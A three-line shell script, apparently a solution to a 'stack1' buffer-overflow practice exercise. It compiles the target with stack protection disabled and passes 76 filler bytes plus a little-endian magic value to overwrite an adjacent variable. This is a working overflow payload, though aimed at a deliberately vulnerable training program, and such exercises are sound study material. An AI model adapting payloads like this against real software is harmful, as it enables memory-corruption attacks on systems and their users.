#g++ -o stack1 stack1.c -g -Wall -fno-stack-protector
#!/bin/bash
./stack1 `python -c 'print"A"*76 + "\x64\x63\x62\x61"'`
